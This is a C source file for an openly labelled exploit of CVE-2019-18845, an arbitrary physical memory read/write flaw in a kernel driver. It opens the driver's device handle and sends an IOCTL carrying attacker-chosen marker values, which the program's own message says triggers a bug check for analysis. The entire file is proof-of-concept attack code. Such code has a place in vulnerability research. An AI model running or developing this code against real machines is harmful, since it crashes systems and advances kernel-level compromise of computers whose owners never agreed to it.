#include "exploit.h"

// This exploit is seriously a pain in the ass lol
int main(int argc, char** argv)
{
	INPUT_OUTPUT_STRUCTURE input_output;
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	unsigned char unused = 0;

	RtlSecureZeroMemory(&input_output, sizeof(input_output));

	SetConsoleTitleA("CVE-2019-18845");

	printf("[*] CVE-2019-18845 - Arbitrary Kernel Physical Memory Read/Write\n[*] Exploit written by ExAllocatePool2.\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	printf("\n[!] Triggering possible bug check to analyze our input...");
	Sleep(3000);

	input_output.BaseAddress = 0x4141414141414141;
	input_output.BusAddress = 0x4242424242424242;			// Stored in rcx at the start of function
	input_output.CommitSize = 0x43434343;					// Stored in rdx at the start of function
	input_output.Handle = 0x4444444444444444;
	input_output.Object = 0x4545454545454545;

	DeviceIoControl(h_driver, IOCTL_MSIO_MAPPHYSTOLIN, &input_output, sizeof(input_output), &input_output, sizeof(input_output), &bytes_returned, 0);

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}